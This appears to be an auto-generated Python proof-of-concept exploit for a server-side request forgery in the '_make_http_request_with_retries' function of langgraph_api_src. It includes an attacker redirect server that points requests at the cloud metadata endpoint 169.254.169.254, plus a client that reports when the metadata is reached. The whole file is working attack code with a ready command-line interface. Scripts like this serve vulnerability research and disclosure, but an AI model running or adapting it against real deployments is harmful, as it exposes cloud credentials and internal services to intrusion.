#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-017
# Sink: _make_http_request_with_retries
# Auto-generated — run with: python3 ssrf_url_directly_passed_httpx__make_http_request_with_retries.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via _make_http_request_with_retries in langgraph_api_src

This script demonstrates how an attacker can exploit the missing URL validation
in the _make_http_request_with_retries function to perform Server-Side Request
Forgery (SSRF). The function passes the URL directly to httpx.AsyncClient.request
without any host allowlisting or redirect handling, and httpx follows redirects
by default.

Attack scenario:
1. Attacker controls a server that returns a 302 redirect to an internal IP
2. The vulnerable function follows the redirect and fetches from the internal IP
3. This can be used to access cloud metadata endpoints (169.254.169.254),
   internal services, or other restricted resources

Usage:
    python3 poc_ssrf.py [--target TARGET_URL] [--redirect-to REDIRECT_TARGET]

    --target: The URL of the vulnerable endpoint (default: http://localhost:8000)
    --redirect-to: The internal URL to redirect to (default: http://169.254.169.254/latest/meta-data/)
"""

import argparse
import asyncio
import httpx
import sys
from typing import Optional


# Default configuration - change these as needed
DEFAULT_TARGET_URL = "http://localhost:8000"
DEFAULT_REDIRECT_TARGET = "http://169.254.169.254/latest/meta-data/"


async def exploit_ssrf(
    target_url: str,
    redirect_to: str,
    method: str = "GET",
    headers: Optional[dict] = None,
    json_data: Optional[dict] = None,
    max_retries: int = 0,
    base_delay: float = 0.1,
) -> None:
    """
    Exploit the SSRF vulnerability by calling _make_http_request_with_retries
    with a URL that redirects to an internal IP.

    Args:
        target_url: The URL to request (should point to an attacker-controlled
                   server that returns a redirect)
        redirect_to: The internal URL to redirect to (e.g., cloud metadata endpoint)
        method: HTTP method to use
        headers: Headers to include
        json_data: JSON data for POST requests
        max_retries: Maximum retry attempts
        base_delay: Base delay for exponential backoff
    """
    # This is a direct reproduction of the vulnerable function's logic
    # In a real attack, the attacker would control the URL parameter
    for attempt in range(max_retries + 1):
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                print(f"[*] Attempt {attempt + 1}: Requesting {target_url}")
                print(f"[*] This URL should redirect to: {redirect_to}")
                
                response = await client.request(
                    method, target_url, headers=headers, json=json_data
                )
                
                print(f"[+] Response status: {response.status_code}")
                print(f"[+] Response headers: {dict(response.headers)}")
                print(f"[+] Response body (first 500 chars): {response.text[:500]}")
                
                # Check if we got redirected to the internal target
                if response.url != target_url:
                    print(f"[!] Redirect detected! Final URL: {response.url}")
                    if "169.254.169.254" in str(response.url):
                        print("[!] SUCCESS: Accessed cloud metadata endpoint!")
                        print("[!] This confirms SSRF vulnerability")
                
                response.raise_for_status()
                return response

        except (
            httpx.TimeoutException,
            httpx.NetworkError,
            httpx.RequestError,
            httpx.HTTPStatusError,
        ) as e:
            if isinstance(e, httpx.HTTPStatusError) and e.response.status_code < 500:
                print(f"[-] HTTP error {e.response.status_code}: {e}")
                raise e

            if attempt < max_retries:
                delay = base_delay * (2**attempt)
                print(f"[-] Request failed: {e}. Retrying in {delay:.1f}s...")
                await asyncio.sleep(delay)
            else:
                print(f"[-] Request failed after {max_retries + 1} attempts: {e}")
                raise e


async def setup_redirect_server(redirect_to: str, port: int = 9999) -> None:
    """
    Set up a simple HTTP server that returns a 302 redirect to the target.
    This simulates an attacker-controlled server.

    Args:
        redirect_to: The URL to redirect to
        port: Port to listen on
    """
    from http.server import HTTPServer, BaseHTTPRequestHandler
    
    class RedirectHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header("Location", redirect_to)
            self.end_headers()
            self.wfile.write(b"Redirecting...")
        
        def do_POST(self):
            self.send_response(302)
            self.send_header("Location", redirect_to)
            self.end_headers()
            self.wfile.write(b"Redirecting...")
    
    server = HTTPServer(("0.0.0.0", port), RedirectHandler)
    print(f"[*] Starting redirect server on port {port}")
    print(f"[*] Redirecting all requests to: {redirect_to}")
    print("[*] Press Ctrl+C to stop")
    
    try:
        await asyncio.get_event_loop().run_in_executor(None, server.serve_forever)
    except KeyboardInterrupt:
        print("\n[*] Shutting down redirect server")
        server.shutdown()


async def main():
    parser = argparse.ArgumentParser(
        description="SSRF PoC for langgraph_api_src _make_http_request_with_retries"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET_URL,
        help=f"Target URL to request (default: {DEFAULT_TARGET_URL})",
    )
    parser.add_argument(
        "--redirect-to",
        default=DEFAULT_REDIRECT_TARGET,
        help=f"Internal URL to redirect to (default: {DEFAULT_REDIRECT_TARGET})",
    )
    parser.add_argument(
        "--method",
        default="GET",
        choices=["GET", "POST"],
        help="HTTP method to use (default: GET)",
    )
    parser.add_argument(
        "--start-server",
        action="store_true",
        help="Start a redirect server for testing",
    )
    parser.add_argument(
        "--server-port",
        type=int,
        default=9999,
        help="Port for redirect server (default: 9999)",
    )
    
    args = parser.parse_args()
    
    if args.start_server:
        # Start the redirect server
        await setup_redirect_server(args.redirect_to, args.server_port)
    else:
        # Run the exploit
        print("=" * 60)
        print("SSRF Exploit PoC for langgraph_api_src")
        print("=" * 60)
        print(f"\n[*] Target URL: {args.target}")
        print(f"[*] Redirect target: {args.redirect_to}")
        print(f"[*] Method: {args.method}")
        print()
        
        try:
            await exploit_ssrf(
                target_url=args.target,
                redirect_to=args.redirect_to,
                method=args.method,
            )
        except Exception as e:
            print(f"\n[-] Exploit failed: {e}")
            print("[*] Make sure the target server is running and accessible")
            print("[*] If using a redirect server, start it with --start-server")
            sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
